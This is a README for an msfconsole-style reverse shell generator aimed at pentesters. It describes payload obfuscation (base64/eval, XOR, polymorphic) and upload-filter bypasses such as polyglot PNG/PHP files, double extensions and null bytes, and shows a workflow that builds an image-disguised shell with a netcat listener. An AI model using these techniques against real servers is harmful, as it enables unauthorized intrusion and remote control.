# Malqart Shell Module – README

> **Malqart Shell Module** is an interactive, `msfconsole`-style reverse shell generator for offensive security research. Built for speed, stealth, and flexibility, it supports multiple file formats, advanced obfuscation, and upload filter bypass techniques—all in a single Python script with **zero external dependencies**.

---

## 🔥 Features

- **Interactive Console**: `msfconsole`-inspired workflow (`use`, `set`, `run`, `show`)
- **6 Payload Types**: `php`, `phtml`, `png`, `pdf`, `py`, `sh`
- **5 Obfuscation Methods**:
  - `none`
  - `basic` (random variable names)
  - `base64` (encoded + eval)
  - `xor` (XOR + Base64)
  - `polymorphic` (randomly selects an obfuscation method on each run)
- **5 Bypass Techniques**:
  - `double_extension` → `shell.php.png`
  - `polyglot` → Valid image header + PHP payload (for `png`, `jpg`, `gif`)
  - `null_byte` → `shell.php%00.png`
  - `case_manip` → Randomly swaps case (e.g., `sHeLl.PnG`)
  - `none`
- **Auto Listener**: Launch `netcat` listener with `set LISTENER true`
- **Pure Python**: Requires only Python 3.6+ and `nc` (for listener)

---

## 🚀 Quick Start

### Clone & Run
```bash
wget https://raw.githubusercontent.com/yourusername/malqart-shell/main/Malqart_shell_module.py -O malqart.py
chmod +x malqart.py
./malqart.py
```

### Example Workflow
```text
MalqartShell > use png
[*] Using payload: png

MalqartShell > set IP 192.168.1.10
[*] IP => 192.168.1.10

MalqartShell > set PORT 4444
[*] PORT => 4444

MalqartShell > set OBFUSCATE polymorphic
[*] OBFUSCATE => polymorphic

MalqartShell > set BYPASS polyglot
[*] BYPASS => polyglot

MalqartShell > set LISTENER true
[*] LISTENER => true

MalqartShell > run
[+] Payload saved as: shell.png
[+] Starting listener on port 4444...
```

> ✅ Result: `shell.png` is a **valid PNG file** that also executes a reverse shell when processed by PHP.

---

## 🧰 Commands Reference

| Command | Description |
|--------|-------------|
| `use <ext>` | Select payload extension (`php`, `png`, `pdf`, etc.) |
| `set IP <addr>` | Set attacker IP |
| `set PORT <num>` | Set listener port |
| `set OBFUSCATE <method>` | Choose obfuscation (`polymorphic`, `base64`, etc.) |
| `set BYPASS <technique>` | Choose evasion method |
| `set OUTPUT <file>` | Custom output filename |
| `set LISTENER true` | Auto-start netcat after generation |
| `show options` | Display current configuration |
| `show extensions` | List supported file types |
| `show obfuscation` | List obfuscation methods |
| `show bypass` | List bypass techniques |
| `run` or `exploit` | Generate payload |
| `exit` / `quit` | Exit console |

---

## ⚠️ Legal & Ethical Use

> **Malqart Shell Module is for authorized security testing only.**

✅ **DO**:
- Use only on systems you own or have explicit written permission to test.
- Follow responsible disclosure practices.
- Use in educational, research, or bug bounty contexts.

❌ **DON’T**:
- Deploy against systems without authorization.
- Use for malicious or illegal activities.
- Distribute for harmful purposes.

> **You are solely responsible for your actions. The author assumes no liability.**

---

## 📦 Requirements

- **Python** ≥ 3.6
- **Netcat** (`nc`) — for optional listener (install via `sudo apt install netcat` or equivalent)

---

## 💡 Why “Malqart”?

Named after **Melqart**, the Phoenician god of the underworld and merchants—symbolizing **duality**: stealthy yet powerful, hidden yet functional. Like your payloads.

---

## 🌟 Inspired By

- [**ShellForge**](https://github.com/Wael-Rd/ShellForge) – The gold standard in shell generation  
- **Metasploit Framework** – For its legendary interactive console design

---

## 📬 Feedback & Contributions

Found a bug? Have an idea for a new bypass or obfuscation method?

- Open an **Issue**
- Submit a **Pull Request**
- Or just ⭐ the repo!
---

## Author 
Oussama Ben Hadj dahman @cybereagle2001

> **Made with ❤️ for pentesters, red teamers, and bug bounty hunters.**  
> **Malqart Shell Module – Where shells are forged in stealth.**
